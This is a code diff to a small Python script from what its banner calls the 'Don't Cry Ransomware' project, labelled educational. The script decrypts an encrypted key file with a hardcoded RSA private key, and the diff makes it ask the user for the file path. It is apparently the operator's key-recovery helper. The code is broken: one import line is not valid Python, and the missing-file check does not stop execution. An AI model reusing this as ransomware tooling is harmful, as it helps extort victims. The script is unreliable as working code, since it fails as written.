@@ -1,5 +1,15 @@
+################################################################################
+#                             Don't Cry Ransomware                             #
+#                          ! EDUCATIONAL PURPOSES ONLY !                       #
+################################################################################
+
+import os
+
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+import from colorama import Fore, init
+
+init(autoreset=True)
 
 RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
 MIIEqAIBAAKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/g
@@ -38,7 +48,10 @@ def decrypt_key(encrypted_key):
 
 
 if __name__ == "__main__":
-    with open("key.bin", "rb") as f:
+    path = input("Enter the file path: ")
+    if not os.path.exists(path):
+        print(f"{Fore.LIGHTRED_EX}Please enter an existing file path!")
+    with open(path, "rb") as f:
         encrypted_key = f.read()
     decrypted_key = decrypt_key(encrypted_key)
     print(decrypted_key)
